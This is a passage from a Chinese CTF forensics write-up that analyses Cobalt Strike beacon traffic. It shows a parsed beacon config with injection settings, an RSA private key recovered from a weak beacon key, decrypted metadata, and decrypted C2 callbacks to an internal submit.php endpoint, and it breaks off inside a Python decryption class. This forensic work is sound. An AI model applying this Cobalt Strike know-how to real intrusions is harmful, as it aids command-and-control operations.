class="line">  Build Metadata: [<span class="number">7</span>:Metadata,<span class="number">3</span>,<span class="number">6</span>:Cookie]</span><br><span class="line">   BASE64</span><br><span class="line">   Header Cookie</span><br><span class="line"><span class="number">0x000d</span> http_post_header                 <span class="number">0x0003</span> <span class="number">0x0200</span></span><br><span class="line">  Const_header Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line">  Build SessionId: [<span class="number">7</span>:SessionId,<span class="number">5</span>:<span class="built_in">id</span>]</span><br><span class="line">   Parameter <span class="built_in">id</span></span><br><span class="line">  Build Output: [<span class="number">7</span>:Output,<span class="number">4</span>]</span><br><span class="line">   Print</span><br><span class="line"><span class="number">0x0036</span> HostHeader                       <span class="number">0x0003</span> <span class="number">0x0080</span> (NULL ...)</span><br><span class="line"><span class="number">0x0032</span> UsesCookies                      <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">1</span></span><br><span class="line"><span class="number">0x0023</span> proxy_type                       <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">2</span> IE settings</span><br><span class="line"><span class="number">0x003a</span> TCP_FRAME_HEADER                 <span class="number">0x0003</span> <span class="number">0x0080</span> <span class="string">&#x27;\x00\x04&#x27;</span></span><br><span class="line"><span class="number">0x0039</span> SMB_FRAME_HEADER                 <span class="number">0x0003</span> <span class="number">0x0080</span> <span class="string">&#x27;\x00\x04&#x27;</span></span><br><span class="line"><span class="number">0x0037</span> EXIT_FUNK                        <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0028</span> killdate                         <span class="number">0x0002</span> <span class="number">0x0004</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0029</span> textSectionEnd                   <span class="number">0x0002</span> <span class="number">0x0004</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x002b</span> process-inject-start-rwx         <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">64</span> PAGE_EXECUTE_READWRITE</span><br><span class="line"><span class="number">0x002c</span> process-inject-use-rwx           <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">64</span> PAGE_EXECUTE_READWRITE</span><br><span class="line"><span class="number">0x002d</span> process-inject-min_alloc         <span class="number">0x0002</span> <span class="number">0x0004</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x002e</span> process-inject-transform-x86     <span class="number">0x0003</span> <span class="number">0x0100</span> (NULL ...)</span><br><span class="line"><span class="number">0x002f</span> process-inject-transform-x64     <span class="number">0x0003</span> <span class="number">0x0100</span> (NULL ...)</span><br><span class="line"><span class="number">0x0035</span> process-inject-stub              <span class="number">0x0003</span> <span class="number">0x0010</span> (NULL ...)</span><br><span class="line"><span class="number">0x0033</span> process-inject-execute           <span class="number">0x0003</span> <span class="number">0x0080</span> <span class="string">&#x27;\x01\x02\x03\x04&#x27;</span></span><br><span class="line"><span class="number">0x0034</span> process-inject-allocation-method <span class="number">0x0001</span> <span class="number">0x0002</span> <span class="number">0</span></span><br><span class="line"><span class="number">0x0000</span></span><br><span class="line">Guessing Cobalt Strike version: <span class="number">4.3</span> (<span class="built_in">max</span> <span class="number">0x0046</span>)</span><br><span class="line">Sanity check Cobalt Strike config: OK</span><br><span class="line">Sleep mask <span class="number">64</span>-bit <span class="number">4.2</span> deobfuscation routine found: <span class="number">0x0000ff40</span> (LSFIF: <span class="string">b&#x27;t3E;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>pubkey是DER，转换为PEM</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -inform DER -pubin -<span class="keyword">in</span> &lt;(python -c <span class="string">&#x27;import binascii; hex_string = &quot;30819e300d06092a864886f70d010101050003818c00308188028180525e1781f2f02d132a7818a6d269baddbf39352c8d20290ec2294fbe4d77e6549ef4766d8b0e1620000adfbd7aff99cd72f05623eb0def202265cf631dd895acd5e981da8424c03a295895c8194a31641f2eecd5a8715ca89cdbf9433c5d437538767666c3bdb0f8629555375b574fe408a94ae82f92960085d416374f1654b302030100010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;; import sys; sys.stdout.buffer.write(binascii.unhexlify(hex_string))&#x27;</span> ) -outform PEM -out publickey.pem</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUs</span><br><span class="line">jSApDsIpT75Nd+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHa</span><br><span class="line">hCTAOilYlcgZSjFkHy7s1ahxXKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUro</span><br><span class="line">L5KWAIXUFjdPFlSzAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我猜可能是CS远端服务器用私钥加密了，然后我们肉鸡用公钥解密，要不然说不通，结果我猜对了（见下图）</p>
<blockquote>
<p>图源：<a href="https://www.freebuf.com/articles/network/407982.html">https://www.freebuf.com/articles/network/407982.html</a></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/69a03410-3d29-4cb3-a8cd-6ddfe220223f-1737195799564-7.png"></p>
<p>接着用RsaCtfTool爆私钥</p>
<blockquote>
<p><a href="https://github.com/RsaCtfTool/RsaCtfTool">https://github.com/RsaCtfTool/RsaCtfTool</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO</span><br><span class="line">FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx</span><br><span class="line">XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC</span><br><span class="line">gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE</span><br><span class="line">I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf</span><br><span class="line">pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1</span><br><span class="line">qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS</span><br><span class="line">fIJV420CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3</span><br><span class="line">PNG942FAOMPBhkEGXmu9KKeEUnyCVeSfAkB6vJQuKe+zaDVMoXKbyxIH8DEJXFkh</span><br><span class="line">XjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwgp/pk3lIJdDctay9ZAkAhlDeu</span><br><span class="line">CcNj6hXYyg592tsO49ZwZhGedik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rU</span><br><span class="line">ITOC24rZU4XNUfV7AkAipEfvmXf4RaJLlIoWZe/XkNXpGcsYIeaedUv29xqaNAbA</span><br><span class="line">7HhEs3twu6+G0QP1YuAPNp28FNoe52XfJhVWTw1D</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>然后转成der格式，在变成hex，变成下面这一堆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3082025a020100028180525e1781f2f02d132a7818a6d269baddbf39352c8d20290ec2294fbe4d77e6549ef4766d8b0e1620000adfbd7aff99cd72f05623eb0def202265cf631dd895acd5e981da8424c03a295895c8194a31641f2eecd5a8715ca89cdbf9433c5d437538767666c3bdb0f8629555375b574fe408a94ae82f92960085d416374f1654b3020301000102818029595aebbd8d9cd3364abbf56343f8af4143f2d1beb71a65724b52e0f1faf302201a1129c4d8f97a6f0b066f14c423ede3798b84d4875638078c9ca3e163cd1f392830b3abd2ae2ec27319cc504127dc0330e184b00486811a474b9dfc5fa5b4bf91451bff3eff035491b4dab59f88596229e71b636952e88ed56ab01ea386a10241009135e3e555b7c38d188675a887f872a027026b689cf8720cd7586500b4225c4dcf28b1a3f96795373cd1bde3614038c3c18641065e6bbd28a784527c8255e36d0241009135e3e555b7c38d188675a887f872a027026b689cf8720cd7586500b4225c4dcf28b1a3f96795373cd1bde3614038c3c18641065e6bbd28a784527c8255e49f02407abc942e29efb368354ca1729bcb1207f031095c59215e352067e4a75d9a956e67253c511ee3c0a9f9cc46b644632617c0219c20a7fa64de520974372d6b2f590240219437ae09c363ea15d8ca0e7ddadb0ee3d67066119e762938070ddc3acb9352beebe720470548012d044787f42e38b233e74ad4213382db8ad95385cd51f57b024022a447ef9977f845a24b948a1665efd790d5e919cb1821e69e754bf6f71a9a3406c0ec7844b37b70bbaf86d103f562e00f369dbc14da1ee765df2615564f0d43</span><br></pre></td></tr></table></figure>

<p>下一步要提取metadata，用的是<a href="https://github.com/minhangxiaohui/CSthing/blob/master/cs-decrypt-metadata_V0_0_1/cs-decrypt-metadata.py">https://github.com/minhangxiaohui/CSthing/blob/master/cs-decrypt-metadata_V0_0_1/cs-decrypt-metadata.py</a></p>
<p>这里后面的那个<code>SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=</code>是来自流量包的Cookie</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python metadata.py -p <span class="string">&quot;3082025a020100028180525e1781f2f02d132a7818a6d269baddbf39352c8d20290ec2294fbe4d77e6549ef4766d8b0e1620000adfbd7aff99cd72f05623eb0def202265cf631dd895acd5e981da8424c03a295895c8194a31641f2eecd5a8715ca89cdbf9433c5d437538767666c3bdb0f8629555375b574fe408a94ae82f92960085d416374f1654b3020301000102818029595aebbd8d9cd3364abbf56343f8af4143f2d1beb71a65724b52e0f1faf302201a1129c4d8f97a6f0b066f14c423ede3798b84d4875638078c9ca3e163cd1f392830b3abd2ae2ec27319cc504127dc0330e184b00486811a474b9dfc5fa5b4bf91451bff3eff035491b4dab59f88596229e71b636952e88ed56ab01ea386a10241009135e3e555b7c38d188675a887f872a027026b689cf8720cd7586500b4225c4dcf28b1a3f96795373cd1bde3614038c3c18641065e6bbd28a784527c8255e36d0241009135e3e555b7c38d188675a887f872a027026b689cf8720cd7586500b4225c4dcf28b1a3f96795373cd1bde3614038c3c18641065e6bbd28a784527c8255e49f02407abc942e29efb368354ca1729bcb1207f031095c59215e352067e4a75d9a956e67253c511ee3c0a9f9cc46b644632617c0219c20a7fa64de520974372d6b2f590240219437ae09c363ea15d8ca0e7ddadb0ee3d67066119e762938070ddc3acb9352beebe720470548012d044787f42e38b233e74ad4213382db8ad95385cd51f57b024022a447ef9977f845a24b948a1665efd790d5e919cb1821e69e754bf6f71a9a3406c0ec7844b37b70bbaf86d103f562e00f369dbc14da1ee765df2615564f0d43&quot;</span> <span class="string">&quot;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&quot;</span></span><br></pre></td></tr></table></figure>

<p>得到rawkey、aeskey和hmackey</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Encrypted metadata:</span> <span class="string">SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=</span></span><br><span class="line"><span class="attr">Decrypted:</span></span><br><span class="line"><span class="attr">Header:</span> <span class="string">0000beef</span></span><br><span class="line"><span class="attr">Datasize:</span> <span class="string">0000005d</span></span><br><span class="line"><span class="attr">Raw key:</span>  <span class="string">28ab951fc96bcb93ec13cf9dd5f21373</span></span><br><span class="line"> <span class="attr">aeskey:</span>  <span class="string">9fe14473479a283821241e2af78017e8</span></span><br><span class="line"> <span class="attr">hmackey:</span> <span class="string">1e3d54f1b9f0e106773a59b7c379a89d</span></span><br><span class="line"><span class="attr">charset:</span> <span class="string">03a8</span> <span class="string">ANSI/OEM</span> <span class="string">Simplified</span> <span class="string">Chinese</span> <span class="string">(PRC,</span> <span class="string">Singapore);</span> <span class="string">Chinese</span> <span class="string">Simplified</span> <span class="string">(GB2312)</span></span><br><span class="line"><span class="attr">charset_oem:</span> <span class="string">03a8</span> <span class="string">ANSI/OEM</span> <span class="string">Simplified</span> <span class="string">Chinese</span> <span class="string">(PRC,</span> <span class="string">Singapore);</span> <span class="string">Chinese</span> <span class="string">Simplified</span> <span class="string">(GB2312)</span></span><br><span class="line"><span class="attr">bid:</span> <span class="string">4350dfec</span> <span class="number">1129373676</span></span><br><span class="line"><span class="attr">pid:</span> <span class="string">0b50</span> <span class="number">2896</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">flags:</span> <span class="string">0e</span></span><br><span class="line"><span class="attr">var1:</span> <span class="number">6</span></span><br><span class="line"><span class="attr">var2:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">var3:</span> <span class="number">7600</span></span><br><span class="line"><span class="attr">var4:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">var5:</span> <span class="number">1996621008</span></span><br><span class="line"><span class="attr">var6:</span> <span class="number">1996633200</span></span><br><span class="line"><span class="attr">var7:</span> <span class="number">2360912064</span></span><br><span class="line"><span class="attr">Field:</span> <span class="string">b&#x27;WIN-RRI9T9SN85D&#x27;</span></span><br><span class="line"><span class="attr">Field:</span> <span class="string">b&#x27;Administrator&#x27;</span></span><br><span class="line"><span class="attr">Field:</span> <span class="string">b&#x27;artifact.exe&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后用这个提取traffic <a href="https://github.com/minhangxiaohui/CSthing/blob/master/cs-parse-http-traffic/cs-parse-http-traffic.py">https://github.com/minhangxiaohui/CSthing/blob/master/cs-parse-http-traffic/cs-parse-http-traffic.py</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python traffic.py -r 28ab951fc96bcb93ec13cf9dd5f21373 -Y <span class="string">&quot;http.request.uri.path contains submit&quot;</span> cscs.pcapng</span><br></pre></td></tr></table></figure>

<p>注意traffic.py的第489行要改编码方式（上面解密metadata里面有charset）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> callback <span class="keyword">in</span> [<span class="number">17</span>, <span class="number">30</span>, <span class="number">32</span>]:</span><br><span class="line">    oOutput.Line(callbackdata.decode(<span class="string">&quot;gb2312&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>得到了如下的信息（HMAC打印是我加的用来调试的，原脚本没有）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">(venv) ➜  CSCS python traffic.py -r 28ab951fc96bcb93ec13cf9dd5f21373 -Y &quot;http.request.uri.path contains submit&quot; cscs.pcapng</span><br><span class="line"></span><br><span class="line">Packet number: 6929</span><br><span class="line">HTTP request POST</span><br><span class="line">http://10.11.4.3:12345/submit.php?id=1129373676</span><br><span class="line">Length raw data: 68</span><br><span class="line">Calculated HMAC: b&#x27;19e493e351c9f631d6785d5c07eae9e3&#x27;</span><br><span class="line">Provided HMAC: b&#x27;19e493e351c9f631d6785d5c07eae9e3&#x27;</span><br><span class="line">Counter: 2</span><br><span class="line">Callback: 30 OUTPUT</span><br><span class="line">win-rri9t9sn85d\administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Packet number: 7279</span><br><span class="line">HTTP request POST</span><br><span class="line">http://10.11.4.3:12345/submit.php?id=1129373676</span><br><span class="line">Length raw data: 356</span><br><span class="line">Calculated HMAC: b&#x27;854dfa5777a23989286770da6e0444d0&#x27;</span><br><span class="line">Provided HMAC: b&#x27;854dfa5777a23989286770da6e0444d0&#x27;</span><br><span class="line">Counter: 3</span><br><span class="line">Callback: 30 OUTPUT</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 1870-3553</span><br><span class="line"></span><br><span class="line"> C:\Users\Administrator\Desktop 的目录</span><br><span class="line"></span><br><span class="line">2024/12/16  15:05    &lt;DIR&gt;          .</span><br><span class="line">2024/12/16  15:05    &lt;DIR&gt;          ..</span><br><span class="line">2024/12/16  15:05            17,920 artifact.exe</span><br><span class="line">               1 个文件         17,920 字节</span><br><span class="line">               2 个目录 51,166,601,216 可用字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Packet number: 9797</span><br><span class="line">HTTP request POST</span><br><span class="line">http://10.11.4.3:12345/submit.php?id=1129373676</span><br><span class="line">Length raw data: 212</span><br><span class="line">Calculated HMAC: b&#x27;890e75fcce939f1c8e0922ce5044bc3a&#x27;</span><br><span class="line">Provided HMAC: b&#x27;890e75fcce939f1c8e0922ce5044bc3a&#x27;</span><br><span class="line">Counter: 4</span><br><span class="line">Callback: 22 TODO</span><br><span class="line">b&#x27;\x00\x00\x00\x01&#x27;</span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line">C:\Users\Administrator\Desktop\*</span><br><span class="line">D       0       12/16/2024 15:05:42     .</span><br><span class="line">D       0       12/16/2024 15:05:42     ..</span><br><span class="line">F       17920   12/16/2024 15:05:30     artifact.exe</span><br><span class="line">F       282     08/23/2017 14:18:35     desktop.ini</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Packet number: 12142</span><br><span class="line">HTTP request POST</span><br><span class="line">http://10.11.4.3:12345/submit.php?id=1129373676</span><br><span class="line">Length raw data: 260</span><br><span class="line">Calculated HMAC: b&#x27;1b29173fd3308ff08d30b2a7d42132d4&#x27;</span><br><span class="line">Provided HMAC: b&#x27;1b29173fd3308ff08d30b2a7d42132d4&#x27;</span><br><span class="line">Counter: 5</span><br><span class="line">Callback: 22 TODO</span><br><span class="line">b&#x27;\x00\x00\x00\x02&#x27;</span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line">C:\Users\Administrator\Desktop\*</span><br><span class="line">D       0       12/16/2024 15:08:31     .</span><br><span class="line">D       0       12/16/2024 15:08:31     ..</span><br><span class="line">F       17920   12/16/2024 15:05:30     artifact.exe</span><br><span class="line">F       282     08/23/2017 14:18:35     desktop.ini</span><br><span class="line">F       349588  12/16/2024 15:08:31     secret.pcapng</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Callbacks summary:</span><br><span class="line"> 22 TODO: 2</span><br><span class="line"> 30 OUTPUT: 2</span><br></pre></td></tr></table></figure>

<p>发现存在一个secret.pcapng，想想怎么提取，过滤http请求并按照请求大小排序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/mstsc_QjLx42MuuF-1737195799564-15.png"></p>
<p>12133的包拿出来以后，把解密流量的逻辑拿出来发现可以解出来文件，但我找不到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定 IV</span></span><br><span class="line">CS_FIXED_IV = <span class="string">b&#x27;abcdefghijklmnop&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cCrypto</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rawkey=<span class="string">&#x27;&#x27;</span>, hmacaeskeys=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化解密对象</span></span><br><span class="line"><span class="string">        :param rawkey: 原始密钥（16字节）</span></span><br><span class="line"><span class="string">        :param hmacaeskeys: HMAC 和 AES 密钥（以冒号分隔）</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.rawkey = rawkey</span><br><span class="line">        self.hmacaeskeys = hmacaeskeys</span><br><span class="line">        <span class="keyword">if</span> self.rawkey != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> self.rawkey != <span class="string">&#x27;unknown&#x27;</span>:</span><br><span class="line">            sha256digest = hashlib.sha256(binascii.a2b_hex(self.rawkey)).digest()</span><br><span class="line">            self.hmackey = sha256digest[<span class="number">16</span>:]</span><br><span class="line">            self.aeskey = sha256digest[:<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">elif</span> self.hmacaeskeys != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> self.hmacaeskeys != <span class="string">&#x27;unknown&#x27;</span>:</span><br><span class="line">            self.hmackey = binascii.a2b_hex(self.hmacaeskeys.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">            self.aeskey = binascii.a2b_hex(self.hmacaeskeys.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.hmackey = <span class="literal">None</span></span><br><span class="line">            self.aeskey = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        解密数据</span></span><br><span class="line"><span class="string">        :param data: 加密的字节数据</span></span><br><span class="line"><span class="string">        :return: 解密后的数据</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.aeskey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        encryptedData = data[:-<span class="number">16</span>]  <span class="comment"># 数据去掉 HMAC 后的部分</span></span><br><span class="line">        hmacSignatureMessage = data[-<span class="number">16</span>:]  <span class="comment"># HMAC 部分</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算 HMAC 校验</span></span><br><span class="line">        hmacSignatureCalculated = hmac.new(self.hmackey, encryptedData, hashlib.sha256).digest()[:<span class="number">16</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Calculated HMAC: <span class="subst">&#123;binascii.b2a_hex(hmacSignatureCalculated)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Provided HMAC: <span class="subst">&#123;binascii.b2a_hex(hmacSignatureMessage)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hmacSignatureMessage != hmacSignatureCalculated:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;HMAC signature invalid&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用 AES 进行解密</span></span><br><span class="line">        cipher = AES.new(self.aeskey, AES.MODE_CBC, CS_FIXED_IV)</span><br><span class="line">        decryptedData = cipher.decrypt(encryptedData)</span><br><span class="line">        <span class="keyword">return</span> decryptedData</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        加密数据</span></span><br><span class="line"><span class="string">        :param data: 明文数据</span></span><br><span class="line"><span class="string">        :return: 加密后的数据</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        